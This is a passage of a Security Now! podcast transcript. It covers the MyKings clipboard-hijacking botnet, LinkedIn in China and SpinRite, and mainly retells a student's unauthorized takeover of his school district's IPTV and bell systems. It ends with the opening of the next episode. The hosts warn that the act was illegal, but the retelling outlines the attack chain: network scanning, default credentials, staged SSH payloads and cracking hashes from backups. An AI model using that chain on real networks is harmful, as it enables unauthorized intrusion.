In 2019, Sophos had said that one of the newest modules it had spotted then was that "clipboard hijacker."  And at the time, Sophos had concluded that this MyKings clipboard hijacking module probably wasn't that successful or widely used, "never received more than a few dollars," and that stealing cryptocurrency by hijacking the clipboard didn't look like "the most profitable operation of MyKings."  But in a report just published last week, Avast said that since 2019, MyKings appears to have perfected this module, which now detects addresses pasted for 20 different cryptocurrencies.  The Avast researchers said they had analyzed more than 6,700 samples of the MyKings malware to identify and extract more than 1,300 cryptocurrency addresses used by the gang to collect their funds.  In these addresses, researchers said they found more than $24.7 million in Bitcoin, Ether, and Dogecoin.



LEO:  Doge.  It's Doge.



STEVE:  Oh, Doge, sorry, Doge.



LEO:  It's a meme.  It's a little dogey.  It's a Shiba Inu doge.



STEVE:  Oh, yeah, there's no "d."  There's no second "d" in Doge.



LEO:  Yeah, Doge.  It was a joke coin until it started becoming valuable.



STEVE:  Well, in fact it's the most money here.



LEO:  I know.



STEVE:  Bitcoin, the breakdown of that 24.7 into the top three, Bitcoin is at 6.6 million, Ethereum at 7.4 million, Dogecoin at 10.65.



LEO:  What?



STEVE:  So it's more than the others.



LEO:  That's hysterical.



STEVE:  Yeah.  Actually, they must be very low value because that 6.6 bitcoin is only 132 of them, whereas that 10.65 million in Doge is 44.618 billion.



LEO:  I just think it's bizarre that a ransomware gang would demand Dogecoin.  It's hysterical to me.  But it's interesting.  So it's not just Bitcoin.  



STEVE:  Yeah.  I think one of the reasons may be that it's one means of staying under the radar.



LEO:  Yeah, yeah, yeah.



STEVE:  Although also remember these are not ransomwares.  These are currency transfer intercepts.  So people buying and selling, using Dogecoin, have lost $10.652 million.



LEO:  Oh, I see.



STEVE:  Where they send payment to someone who says, "When are you going to send it?"  And the guy says, "I already did."  And the guy's, "I didn't get it."



LEO:  Yeah.  Now it makes sense.  Anybody who's using Dogecoin is probably ripe for the plucking.



STEVE:  Yeah.  So, and what's interesting is that Avast used their AV network to collect the 6,700 samples of malware.  So they have a really - they have a great perspective into what's going on.  The Avast researcher said:  "We can safely assume that this number is in reality higher because the totals we show consist of money gained in only three cryptocurrencies from the more than 20 in total being used by the malware."



While the researchers said that some funds were linked to MyKings' past cryptocurrency mining activity, the vast majority appears to have come from the overwhelming success of the clipboard hijacking module.  In other words, intercepting the transfer at the desktop of cryptocurrency payments and receptions.  Well, payments aimed at someone changing the destination wallet.  And, you know, we use cut-and-paste because who can type that?  I mean, of course you're going to use your wallet in order to copy and paste that into a destination field.



So at that point the malware says, aha, and changes it.  Avast said that since the beginning of 2020, its own AV software had detected and flagged MyKings malware attacks on more than 144,000 computers.  So it's a widespread malware.  And I forgot to put in the show notes, but everybody, the takeaway is be careful.  If you're actively transacting in cryptocurrency, make sure you don't have a nasty sitting quietly in your machine, playing gotcha.  Anyway, but since the users of their AV represent a small fraction of all users, the number of systems attacked is certainly higher, and there's probably a lot of these transactions that Avast was not privy to.



As a result of these just-published findings, malware analysts have completely changed how they are viewing this botnet.  With the ability to carry out large-scale exploitation attacks, a way to profit from their operations, a large number of infected hosts, and the ability to download and run any additional payload the MyKings operators may wish, the botnet has now established itself, that is, the MyKings botnet, as one of the most dangerous malware operations going today.  So I wanted to put it on all of our listeners' radar.



LinkedIn is going to dramatically pare down its offering in China.  They have for some time been the only major American social network allowed to still operate in China.  But last Thursday the - as we know, Microsoft bought them - Microsoft-owned company announced that it would be dramatically slimming down its operation, and that until recently, well, it will be slimming down its operation, that it will temporarily pulling up stakes and shuttering its platform until it comes back with something else.



LinkedIn said that "significantly more challenging operating environment and greater compliance requirements" by Beijing authorities were behind the decision.  Other social media services, as we know, like Twitter and Facebook, have been blocked in China for years.  Those companies' inability to control what's posted on their sites disqualified them for their presence in China.  And until now, LinkedIn had been able to maintain its presence only because it was censoring many of the posts being made by its users.  They said:  "While we found success in helping Chinese members find jobs and economic opportunity, we have not found that same level of success in the more social aspects of sharing and staying informed."



Even so, LinkedIn ran afoul of Chinese Internet content regulators in March when China's Internet watchdog, the Cyberspace Administration of China (CAC) warned LinkedIn that it was failing to control what CAC saw as objectionable political content.  The regulator told LinkedIn it had to do better.  In response, the company wrote a kind of self-criticism and filed it with the CAC.  Around the same time, the company announced publicly that it would "temporarily" suspend new sign-ups.  And in their statement yesterday, LinkedIn made clear that while it was trying to abide by local regulations, in the end doing so became too much.  They said:  "We're also facing a significantly more challenging operating environment and greater compliance requirements in China."



And as I said, LinkedIn is not abandoning China completely.  The company said it will eventually offer its 50 million Chinese members a slimmed-down version of the platform, basically an app focused just on job listings.  Chinese users will not be able to share or comment on posts, which has been a key social media feature of LinkedIn's platform everywhere else.



In 2014, when LinkedIn began working in China, it said it was a global platform "with an obligation to respect the laws that apply to us, including adhering to Chinese government regulations for our localized version of LinkedIn in China."  The company even sold a stake of its Chinese operation to local venture capital partners and said it would be able to abide by local law by using software algorithms and human reviewers to make sure posts did not offend Beijing.  But apparently that was insufficient.  So it'll just be a shadow of its normal offerings.



I had one really nice closing-the-loop tweet that I saw last week posted by a Fred A. Rhoades III.  I grabbed a snap of it as it appeared in my TweetDeck.  He had a bunch of fun icons and emojis and then said "!!!BOOM!!!" surrounded by parens.  He said:  "Anybody out there that deals with MS Windows and hard drives, @SGgrc (Gibson Research Corporation) and his #Insanely #Awesome #SpinRite #Software!"



LEO:  He was very happy.



STEVE:  He was quite happy.  He says:  "It's a must-have!!!  Saved my" - and then we have the "bacon" emoji - "again."  And let's see, looks like seven exclamation points.  Then the peace symbol, a smiley face with dark glasses, and a thumbs up.  Anyway, I publicly replied, thanking him for his posting.  To which he replied:  "Every time I run into PC geeks, I always tell them about your software and why they need it.  It has super powers that I've never experienced from any other software."  So Fred, thank you for giving me a perfect lead into my SpinRite update.



Yesterday, oh, actually now it's Sunday.  I wrote this yesterday.  So Sunday I posted the fourth prerelease of SpinRite to the GRC spinrite.dev newsgroup.  The gang there has been having a field day running it on all of their multiple PCs and reporting their results.  I have a punch list of things to fix as a result, and I have an idea actually for a cool new surprise feature I haven't even told them about, which will appear on the benchmark's conclusion screen.  So I'll be working to get everything resolved and running before I move forward again.



This is a key juncture because everything from here on out builds upon this foundation that we're now working to make bulletproof.  In other words, there isn't anything else that can go wrong once a descendant of this fourth release is running for everyone on all their hardware.  And actually it looks like I broke something that was running at the end of the third release, the third prerelease, which no longer works.  So like when the problems are being reported, they'll run it on the last of the third prerelease, where it works.



And that was at the end of April, so there's been a lot of time, and I've done a lot of rewriting.  There was a lot of things I changed.  I thought I was making things better, probably was, but I broke something.  And it looks like it's around an Intel chipset on Lenovo laptops.  So I've got plenty of those around here.  I just didn't try it.  So I'll do that.  I'll fix that.  And then I think we're going to be in good shape.



Anyway, we're currently, what we're doing, is locating all of their systems' controllers, wherever they are, and all of the drives attached to each one.  We're determining how to best determine - "we" meaning SpinRite - determining how to best communicate with each drive through its controller, then doing so with that method, and performing read and write confidence tests to verify everything.  And then finally benchmarking.  The fact that we're now performing benchmarks on these drives in SpinRite and seeing hundreds of megabytes per second of throughput means that we'll be seeing many gigabytes per minute and terabytes per hour to deliver vastly faster performance than we've ever had, while also even improving upon SpinRite's ability to recover data from troubled mass storage devices because it'll be so much faster, I'll be able to do basically dig a little bit deeper.  So yay.  



LEO:  Yay, yay, yay.



STEVE:  And thank you, everybody, for your ongoing support of this work.  I really appreciate it.



LEO:  Get your copy.  Go to GRC.com.  Get yourself a copy.



STEVE:  Here's my water.  You know what's going to happen next.



LEO:  You're almost out of that gallon jug.  You'd better get some more water in there.  This one's just for fun, though.  I like this story.



STEVE:  This one is neat.  And, yeah.  Okay.  So just to start us off all on the same page, Wikipedia explains rickrolling as, it says:  "Rickrolling, alternatively rick-rolling or rickroll, is a prank and an Internet meme involving an unexpected appearance of the music video for the 1987 song 'Never Gonna Give You Up,' performed by the English singer Rick Astley.  The meme is a type of bait and switch using a disguised hyperlink that leads to the music video.  When victims click on a seemingly unrelated link, the site with the music video loads instead of what was expected, and in doing so they are said to have been 'Rickrolled.'  The meme has also extended to using the song's lyrics, or singing it, in unexpected contexts."  And as we'll see, that's what happens in this case. 



Upon learning that a quite industrious Illinois high school senior by the name of Minh Duong, he's of Vietnamese descent, had deeply hacked not only his own high school's network, but the networks of his entire high school district, my initial dread was imagining that he'd been immediately arrested by district officials who lacked any sense of perspective or humor.  After all, these days apparently just the "View Source" menu item on a web browser...



LEO:  Oh, you saw that, yeah.



STEVE:  ...and then viewing the source is all it takes.  And yeah, Leo, I didn't mention this, but many people tweeted this.  There was some idiot governor somewhere...



LEO:  Missouri, governor of Missouri, yeah.  I know, yeah.



STEVE:  So a reporter clicked View Source on some website and noticed that all, was it the Social Security numbers of a thousand government employees was like, visible on the page, in the source.



LEO:  Yeah.  The reporter even did everything right.  They disclosed it to the state before they printed the story the next day.  And still the governor called him a hacker.  "He should go to jail for this."



STEVE:  That's advanced hacking, Leo.



LEO:  It's too embarrassing is what it is.  It's just he was just embarrassed.



STEVE:  Wow.



LEO:  Anyway, yeah.  Everything, the hacking...



STEVE:  Anyway, the good news is...



LEO:  I'm surprised, I am totally surprised that Minh did not go to jail, go directly to jail.



STEVE:  Yes.  And you'll hear both he and I have some caveats about this.  The good news is the nature and intent of this prank was kept in perspective, and District 214's cybersecurity was improved as a result.



LEO:  Collects on the website videos of this happening.  The bell goes off, and [laughter].  Little later in the video he goes down the hall, and you see all the students, it's happened in every classroom in every school in every district.  Oh, my gosh.  I know you'll talk about what he did.  But he did some very clever things to make sure teachers couldn't mute it, couldn't stop it.



STEVE:  Oh, yeah.  We have everything here.  And the video you showed started just before the event.  It actually, well, I have all that here, so I'll explain it all.



LEO:  Yeah.



STEVE:  Okay.  So what did Minh do, and how did he do it?  I should first explain that this didn't just happen.  The rickrolling event began at 11:55 a.m. on Friday, April 30th.  And actually that's a typo.  It's 10:55 a.m. on Friday, April 30th, which was a time carefully chosen so as to be minimally disruptive and intrusive.  Minh has since graduated and is now studying cybersecurity at the nearby University of Illinois.  But the nature, breadth, and depth of his epic hack came to the cybersecurity industry's attention when he for the first time posted the whole back story on his whitehoodhacker.net blog.



Okay.  So to discharge the suspense of what Minh's fellow students experienced, this was the culmination of several years of planning.  The operation was code-named Big Rick.  At 10:55 a.m. on Friday, April 30th, all of the presentation screens and projectors in every class in every high school in the district switched on.  If they were motorized projection screens, they'd lowered and deployed themselves with no one doing anything.  The remote control was ineffective to move the screen back up.  Nothing worked. 



The district uses something known as the AvediaPlayer, which is an IoT device, as the common interface for all classroom screens.  At first, the only thing displayed simultaneously on every screen in every room in the district was a message stating that an important announcement was forthcoming, with a timer patiently counting down from five minutes.  So nothing like this had ever appeared on any of the screens before.  So naturally, when the timer hit zero, everyone was waiting to see what the announcement would be.



And in that video that he has on his page and which you're showing, Leo, we see one instructor who's, like, looking at the screen behind him like, what the heck is going on?  I mean, he has no idea what's happened.  At one point he picks up the remote control and tries to, like, shut it off, but it doesn't work.  And so it's like, okay, well.  So everyone wanted to see what the announcement would be.  They immediately realized that it was a sophisticated prank when Rick Astley appeared on every screen and began crooning the well-known lyrics to "Never Gonna Give You Up."  The video ran for 10 minutes, then shut down, and the entire system reverted to its normal operation as though nothing out of the ordinary had happened.  



LEO:  It's so funny.



STEVE:  But the prank wasn't quite complete.  At 2:05 PM, all of the school bells rang, signaling the end of a class, just as they should.  But instead of a bell sound, they played the song again.



LEO:  Now, we should explain to non-Americans, and I don't know if this is anywhere else, but in the U.S. there is a tradition of senior pranks for graduating high school seniors.  There's always a prank, or two or three.  So this is a senior prank.  That's what this is.



STEVE:  Right.  It might involve the school bus appearing somehow in a hallway, reassembled overnight.



LEO:  Yes, yes.  There are far more destructive senior pranks.  This isn't as bad as some of them.



STEVE:  So in this case everyone got rickrolled a second time at the end of the day.  After that, Minh immediately sent a 26-page report to the school district, outlining exactly how he and his friends had pulled this off.  And because of that, the district decided not to press charges.  The director of technology had the class to thank them for finding the flaws in their system.



Okay.  So now we know what Minh and company did, let's get his perspective.  But before I go any further, for any of our younger listeners, please do not take this one-off success, which fortunately had a very happy ending, as any form of permission to do anything similar.  Minh was fortunate.  He was not entitled to receive the leniency that he was given.  Make no mistake, there are computer and network intrusion laws on the books that Minh absolutely violated.  It could so very easily have gone so very wrong for him and his friends.  The decision could have been to make an example of them with a zero-tolerance policy, and I would bet that there was some discussion along the way to that end.  So I do not mean to be glamorizing something that I myself would never consider doing today.  Now, okay.



LEO:  But when you were a senior in high school.



STEVE:  Given my history...



LEO:  Yes?



STEVE:  ...I'm quite certain that I would have been foolish enough to do it when I was 18.  Everyone knows the story of the portable dog killer and some of my other youthful antics which I somehow survived without a police record.  But it's been 48 years and the Internet since I was 18, and times have really changed since then.  The grown-ups are terrified of the technology they don't understand and fear that they cannot control.  So poking them with a stick, or with a ping packet these days, is probably not the best idea.  Please don't do it.  Really.



Okay.  With that said, here's how Minh recently described the "Big Rick" hack.  I want to share this with our listeners because there are some wonderfully fun techie details that really serve to bring it to life.  So he wrote:  "On April 30th, 2021, I rickrolled my high school district.  Not just my school, but the entirety of Township High School District 214.  It's one of the largest high school districts in Illinois, consisting of six different schools with over 11,000 enrolled students.



"This story isn't one of those typical rickrolls where students sneak Rick Astley into presentations, talent shows, or Zoom calls.  I did it by hijacking every networked display in every school to broadcast 'Never Gonna Give You Up' in perfect synchronization.  Whether it was a TV in a hall, a projector in a classroom, or a jumbotron displaying the lunch menu, as long as it was networked, I hacked it.  In this post I'll be explaining how I did it and how I evaded detection, as well as the aftermath when I revealed myself and didn't get into trouble."  Okay.  Now, clearly recognizing the same danger I recognize, Minh then places into his description a clear disclaimer.  He posts:  "This post is for educational purposes only.  Do not perform similar activities without explicit permission."



He said:  "We prepared complete documentation of everything we did, including recommendations to remediate the vulnerabilities we discovered.  We sent a comprehensive 26-page penetration test report to the D214 tech team [District 214] and worked with them to help secure their network.  With that said, what we did was very illegal, and some administrations may have pressed charges.  We are grateful that the D214 administration was so understanding."  And actually there's a little bit more.  The details of the way they sent the report and when they sent the report, we'll get to at the end.



So under "Initial Access," he writes:  "This story starts with my freshman year, when I did not have much technical discipline, a time that I can only describe as the beginning of my script kiddie phase.  I didn't understand basic ethics or responsible disclosure, and jumped at every opportunity to break something.  So obviously I became curious about the technology at my high school.  And by 'curious,' I mean port scanning the entire IP range of the internal district network."



He says:  "I had a few friends help out with this project.  And, oh, boy, did we scan.  Our scanning generated so much traffic that our school's technology supervisor caught wind of it and came in at one point to ask us to stop.  Of course we did so immediately.  But by then we had finished scanning the first half of the district's 10-dot address space, in other words a total of 8,388,606 IPs."  And I presume they scanned the entire port space of every one of those IPs.



He said:  "From the results, we found various devices exposed on the district network.  These included printers, IP phones, and even security cameras without any password authentication."  And he says:  "This is where I state the disclaimer again:  Never access other systems in an unauthorized manner without permission."  He says:  "The district tech team was informed about the issue, which they resolved by placing the cameras behind ACL restrictions."  ACL meaning Access Control Lists, meaning only some privileged IPs were able to view those IPs.  He says:  "However, many devices remained exposed to the student network  more importantly for this post, the IPTV system."



So I'll just interject here to observe that the phrase "many devices remain exposed to the student network" should horrify any IT administrator.  Having high school students sharing a network that also contains administrative functions is insane all by itself.  It's about a thousand times worse than having IoT power outlets and light switches phoning home to hostile foreign nations.  If ever there was a case to be made for network segmentation, elementary school, junior high, and high schools are it.  No one should even consider allowing those precious little darlings anywhere near administrative network functions.  Any network that students have access to should be able to touch the Internet and nothing else.



Okay.  So continuing with what Minh wrote, he says - I guess  that's Exterity, yeah.  "Exterity IPTV System.  Before moving on, I will briefly explain the IPTV system.  The system is composed of three products:  AvediaPlayer, AvediaStream, and AvediaServer.  AvediaPlayers are small blue boxes that connect to projectors and TVs. They can send serial commands to their respective device to turn the display on and off, change inputs and volume, switch channels, et cetera."  And also roll and unroll the screens.  "These receivers include both a web interface and an SSH server to execute the serial commands.  Additionally, they run embedded Linux with BusyBox tools and use some obscure CPU architecture designed for IoT devices called ARC (Argonaut RISC Core).



"Next, AvediaStream encoders connect to devices that broadcast live video.  They encode the live feed coming from these devices to the AvediaPlayer receivers, which display the stream.  Encoders are attached to computers that need to broadcast a stream, such as text carousels or morning announcements.  These also have embedded software similar to AvediaPlayers.  Last but not least, AvediaServers allow administrators to control all receivers and encoders at once.  These have typical x86_64 processors and run the enterprise Linux distribution, CentOS.  Like the receivers and encoders, they also have web interfaces and SSH servers.  Since freshman year, I had complete access to the IPTV system.  I only messed around with it a few times and had plans for a senior prank, but it moved to the back of my mind and eventually went forgotten.



"Fast-forward to the second semester of senior year, early 2021.  All the schools were doing hybrid instruction because of COVID-19 pandemic.  Up to this point, in-person instruction was opt-in, with most students opting to stay remote, myself included.  But in March, the superintendent announced that in-person instruction would switch to an opt-out model on April 5th.  Since almost all students would be back in school, I realized that a senior prank involving the IPTV system was now worthwhile.  A few days later, I decided to share my thoughts with a few close friends.  I gathered a small team across the district and started preparing.  We began to refer to the operation as 'the Big Rick.'



"The first thing we focused on was figuring out how to control all the projectors at once.  While we could send commands to each receiver using a web interface, it would not be ideal spamming HTTP traffic to every receiver simultaneously.  Instead, I used the SSH access on each receiver as the command-and-control channel.  I developed a simple shell script that would serve as a staged payload to be uploaded in advance to each receiver ahead of time.  This script contained various functions that could execute requests to the web interface locally on the receiver.  Thanks to the increased flexibility from the payload, I could also back up and restore all receiver settings to the file system after the rickroll was over.



"In the actual payload, I repeatedly looped commands to keep the rickroll running.  For example, every 10 seconds, the display would power on and set the maximum volume.  This way, if someone" - a teacher - "attempted to power off the projector or mute it, it would revert and continue playing.  The only way to shut it off would be to pull the plug or change the input source."  He says:  "Looping input causes flashes even if the current source is the same as the latest source.  I had to rely on a failsafe input switch that activated right before the rickroll started to ensure everyone was tuned in.  You can see this flash in the video at the 48-second countdown."  In other words, what he meant was he would have loved to be able to also force the input selection to continually refresh every 10 seconds, but he refused to tolerate a 10-second flash interruption.  So he decided just to do it once and be satisfied with that.  And we're looking at it now in the video that Leo's playing.



LEO:  Here it comes.



STEVE:  53, 52.  So it'll be at 48.



LEO:  There it goes.



STEVE:  Yup, there it is.  It blanked out.  And that's as he sent the selection to the projector just to make sure that it was on the correct channel.  And I'm sure he did it once at the - he did it beforehand at the five-minute, the start of the five-minute countdown, and then again shortly before the video was played.  



LEO:  It's so impressive that he thought so much of this out.  It's really neat.



STEVE:  Yes.  Oh, and wait till you get to the testing, Leo, how he tested this.  Because, you know, you wouldn't want anybody to see it happening.  And you've got to test that kind of thing.  He said:  "The vulnerabilities exploited to gain initial access were implementation-specific.  In other words, the district's tech team was at fault for using default passwords.  However, I discovered vendor privilege escalation vulnerabilities in all of Exterity's IPTV products, allowing me to gain root across all systems.  One of these bugs was a simple GTFO-bin, but the other two are novel vulnerabilities that I cannot and should not publish."



Okay.  The expression "GTFO-bin" is a reference to a curated list of Unix and Linux binaries that can be used to bypass local security restrictions in misconfigured systems.  So Minh found a command, just a standard Linux command, on the system that could be leveraged due a fault in some other security configuration.  So he was able to get through.



He said:  "The next issue we tackled was setting up a custom video stream to play the rickroll in real-time.  We needed to broadcast multicast traffic, but only the AvediaStream encoders or the AvediaServers could do this because of ACL restrictions."  Meaning he couldn't do it from some random computer on the network.  ACL, you know, there were some Access List Controls that meant you had to be an AvediaServer or AvediaStream encoder.



He said:  "Setting up the stream was arguably the most time-consuming part of preparation because testing was an absolute pain.  I only needed a single projector for development, but it's not easy when classes are using them during the day.  So I tested at night instead.  I would remotely connect to one of the PCs in the computer lab with the front camera facing the projector.  Then I would record a video to test if the projector displayed the stream correctly."  Okay, so just to expand on that a bit, Minh set up a PC in the computer lab, to which he would be able to gain remote access from home in the evening, with its web cam pointed at the classroom's presentation screen to record and capture whatever the screen would show as he was developing the code to take over the entire district remotely.



He said:  "The lag seen in the video is one of the earlier issues I faced with the stream.  It turned out trying to redirect UDP traffic through the AvediaStream encoders added too much latency.  I fixed this by broadcasting to multicast directly from an AV server using ffmpeg."  So he ended up hacking one of the AvediaServers and using that as his broadcasting host.  And then he said:  "Hopefully I didn't scare any late-night staff."



Under "An Unexpected Development," he said:  "It was April 27th, a mere three days away from the Big Rick finale, when one of my peers discovered a new IP range full of IoT devices following  a scan.  It turns out it was the recently installed bell system, called Education Paging and Intercom Communications."  Thus EPIC.  Thus the Epic Rickroll.  "The majority of the devices in this range were speakers found in hallways, classrooms, et cetera.  Similar to how AvediaPlayers linked to AvediaServers, each speaker connected to an EPIC server for their respective school.  These servers had a web interface locked behind a login page.  Only a single EPIC server had been left with its default credentials configured.  We were able to modify the bell schedule at will, as well as upload custom audio tones.  We could change the bells to play 'Never Gonna Give You Up' instead."



LEO:  That's so amazing.



STEVE:  "However, we only had access to this individual school's EPIC system since it was the only one with vulnerable credentials.  Or was it?  I discovered that the EPIC server we compromised performed weekly backups of its configuration to an external SMB file share.  The credentials for this SMB server were the same default credentials for the EPIC system.  Each backup included a SQL dump of account usernames and password hashes.  Well, what if the other EPIC systems have backup servers as well?  And since these backup servers are separate from the EPIC servers, they might still use default credentials.



This scenario was precisely the case.  From there, I was able to access the password hashes for the other EPIC servers and identify a local admin account available across all the EPIC servers.  After some password cracking, we effectively had control over all the bell schedules throughout the entire district."



LEO:  That's the normal bell.  Maybe this is annoying.  I'm going to turn it down.  It is going to play something eventually; right?



STEVE:  I don't know.  I think that all it played was the rickroll.



LEO:  Oh, because this is not - this is just the bell.  This is the normal bell.  Huh.  I'm just playing it off the web page.



STEVE:  Oh, that's interesting, yeah.  So it's there.  Huh.  I wonder why it's not the modified one.



LEO:  It's very annoying.  I apologize.



STEVE:  Yeah.  Sorry to the students.



LEO:  Yeah, that's a horrible bell.  We used to have actual bells in school.  I don't understand this.



STEVE:  Yeah, [mimicking bell], yeah.



LEO:  That's a terrible noise.



STEVE:  So execution.  "One of our top priorities was to avoid disrupting classes, meaning we could only pull off the prank before school started, during passing periods, or after school.  Before the pandemic, some schools would start earlier, some would start later, some had block scheduling, and some would have all their periods in one day.  Conveniently, due to COVID-19, all the high schools in the district were now on the same block schedule, so we didn't have to worry about scheduling on a per-school basis.



"Another thing was that final exams were right around the corner.  The biggest concern was standardized testing, which wouldn't have breaks during passing periods.  We decided on April 30th, which was the Friday before AP exams started.  We surveyed extensively to check if any significant tests were happening on this day.  We were fully prepared to abort if we learned any standardized testing was taking place.



"In the weeks before the Big Rick, we staged the C2 payload on all of the AvediaPlayers in an automated manner, carefully spreading our actions to avoid detection.  On the day of the Big Rick, we used two of the seven AvediaServers as the C2 masters, which would connect to all the AvediaPlayers and trigger the payloads.



"At 10:40 a.m., rickroll stream goes live with a 20-minute countdown."  And elsewhere he said at 10:55 and a five-minute, so I think maybe he changed his numbering.  He says:  "At 10:55 a.m., AvediaPlayer systems are initialized."  Oh, no.  So rickroll stream goes live with a 20-minute countdown.  For some reason that was just to get everything rolling, but he doesn't actually turn things on until five minutes before.



"At 10:55 a.m., AvediaPlayer streams are initialized, turning on displays and changing the active channel to the rickroll stream.  11:00 a.m., the stream finishes the countdown with the rickroll playing at the end of the first block.  11:10, the payload restores the AvediaPlayer streams to their previous state and removes itself.  2:05 p.m., the end of the third block bell plays a rickroll instead of the dismissal bell.  2:15 p.m., the penetration testing report is automatically sent to the technical supervisors."



We also scheduled another modified bell for 3:25 p.m.  If district tech hadn't still figured out what had happened to revert the bells, a one-minute version of the three-second dismissal bell would play at the end of the day.  They did figure it out.



LEO:  Oh, that's what this was.  It's a minute-long dismissal bell.  It's not the regular bell, yeah.



STEVE:  Okay.  Okay.  So finally, the aftermath.  "A few days after sending the report," which again was sent automatically at the end of the blocks bell, automatically sent, and it was actually - "A few days after sending the report through the anonymous email account, we received an email response from D214's Director of Technology."



LEO:  What the hell?



STEVE:  Uh-huh.  "The director stated that because of our guidelines," that is, the things that they, like, the limitations they put on this, that is, they weren't going to interrupt the test, they really worked, you know, assiduously for this not to be a big problem, "because of our guidelines and documentation, the district would not be pursuing discipline.  In fact, he thanked us for our findings and wanted us to present a debrief to the tech team.  Later, he revealed the superintendents themselves reviewed" - I bet they did - "and were impressed by our report."



He said:  "I was ecstatic that the administration was open to remediating their problems and auditing them with us.  Although the D214 administration communicated good intentions, and they did hold in the future, my peers did not trust the administration and were skeptical of the true nature of the meeting.  One of them referred to the whole thing as a sting operation."



LEO:  Yeah.



STEVE:  "We decided I would reveal myself to present our debrief slides, with the others remaining anonymous in the Zoom meeting.  I had planned on announcing my involvement from the beginning since I wanted to publish this blog post."  He said:  "(I was also pretty much the prime suspect anyways.)"  So I know how that is.



LEO:  Yeah.



STEVE:  "But just in case," he said, I love this, "I scheduled the debrief to take place after I graduated."



LEO:  Yes.  Smart.



STEVE:  "In all seriousness, the debrief went extremely well and was productive for everyone.  We answered clarifying questions from the tech team and gave additional tips for remediation.  We even managed to get the district to look into expanding the IT cybersecurity program and hopefully sponsoring a D214 CTF," you know, a Capture the Flag competition.  He says:  "This has been one of the most remarkable experiences I ever had in high school, and I thank everyone who helped support me.  Thanks all, and thanks for reading."



LEO:  What a great story.  And he deserves, you know, of course, he's at a very well-known school for computer science, Marc Andreessen's alma mater.  And I'm sure he will go on to great things.  He did this perfectly.  Beautifully.



STEVE:  Yeah, he did.  He did.



LEO:  Yeah, yeah.  And he also showed integrity by being willing to take the heat if it turned out the administration wasn't chill about it.  Which I admire him for; you know?  Good for him, yeah.  Pretty hard to punish a guy who comes forward and says, look, you've got problems.  I've figured them all out.  Yes, I was the one who did it, but I'm going to help you patch those holes.  That's good.



STEVE:  Yeah.  And the modifications we made all self-deleted.



LEO:  Right.



STEVE:  We're telling you everything we did.  But we left no cruft behind.



LEO:  I mean, honestly, senior pranks often involved painting the statue out front purple.  I mean, there's all sorts of much more destructive things that happen at the end of every school year.  So this, as things go, was just good fun.  Amusing.  I'm just glad that they had that - it's good that the Governor of Missouri was not present.



STEVE:  Yes, exactly.  I actually, I had that thought when I was writing the note, just like thank goodness that guy was nowhere to be seen.



LEO:  And I have no doubt Minh has a great career ahead of him, pretty much can write his own ticket at this point.  Very well...



STEVE:  Well, and as I said to you last week when you first told us about this on the podcast, my first reaction was hire that guy.



LEO:  Yeah.  This is exactly what you want.  Man, what a great pen tester.  He should be on somebody's red team, that's for sure.



STEVE:  Yeah.



LEO:  Steve, always fun.  I'm glad we could end instead of a scary note on a fun note.  There's plenty enough in the show to scare.  So it's nice to mix it up sometimes.  If you like this show, please, I encourage you to visit Steve's site, GRC.com.  He does have copies of the show.  He has some unique forms, a 16Kb audio version, so it's pretty small.  It's good for the bandwidth-impaired.  He also has human-written transcription that's excellent, nice to read along while you listen.  A lot of people like to do that.  It's all at GRC.com.



While you're there pick up SpinRite, the world's best mass storage maintenance and recovery utility.  6.0 is the current version, but you'll automatically get a free upgrade to 6.1 when that comes out, and you can participate in its development as Steve gets closer and closer.  There's also some great forums there.  There's SQRL.  There's lots of stuff:  GRC.com.



Steve's on Twitter at @SGgrc.  If you want to DM him, that's a good way to get in touch with him, send him Pictures of the Week submissions, things like that:  @SGgrc.  We have copies of the show on our website:  TWiT.tv/sn for Security Now!.  There's also a Security Now! YouTube channel.  And of course you can always subscribe in your favorite podcast application and get it automatically.  Please, if you do that, leave us a five-star review.  Let the world know how valuable Security Now! is, something that you just have to listen to every week.



If you want to watch us do it live, we do have a livestream going at all times, and you can watch any of the shows being produced live at TWiT.tv/live.  There's audio and video streams.  You can chat live at irc.twit.tv or in our Club TWiT Discord Server.  That's it, Steve.  Have a wonderful week.  Foundation, you still watching it?  You moved on?



STEVE:  Haven't since - I think I've seen three, maybe two.



LEO:  They do eventually kind of seem to get to some of the issues...



STEVE:  Well, in fact, didn't we see some scenes from it during yesterday's Apple presentation?



LEO:  Yes, we did.



STEVE:  There were some beautiful - I've got to see it.



LEO:  It was really pretty, yeah.



STEVE:  I mean just, again, I've got to see it.



LEO:  Just turn off the sound and watch the pictures.  That's it.



STEVE:  Perfect.



LEO:  Have a great week, Steve.  We'll see you next time.



STEVE:  Thanks, buddy.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.








GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#842

DATE:		October 26, 2021

TITLE:		The More Things Change... 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-842.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we share some welcome news about Windows 11.  Leo gets his wish about REvil.  Microsoft improves vulnerability report management, attempts to explain their policy regarding the expiration of security updates, and prepares for the imminent release of the next big feature update to Windows 10, 21H2.  Zerodium publicly solicits vulnerabilities in three top VPN providers.  Three researchers disclose their new and devastating "Gummy Browser" attack, which I'll debunk.  Another massively popular JavaScript NPM package has been maliciously compromised and then widely downloaded.  We close the loop by looking at "Nubeva's" claims of having solved the ransomware problem.  We touch on a new annoyance spreading across websites, and also briefly touch on four sci-fi events:  "Dune," "Foundation," "Arrival," and "Invasion."  I briefly update on SpinRite.  Then we'll take a look back to share and discuss a conversation Leo and I had more than 20 years ago.  What's surprising is the degree to which "The More Things Change..." how little, like nothing, actually has.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  There's a lot to talk about, including a maybe less-than-desirable way to get around ransomware.  It seems like it perhaps is promising more than it can deliver.  Why Gummy Browsers aren't really the threat that their discoverer claims them to be.  And we're going to talk about REvil and what really happened to it.  Plus then Steve's going to take us back in time 20 years to a visit he paid to "The Screen Savers."  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 842, recorded Tuesday, October 26, 2021:  The More Things Change...



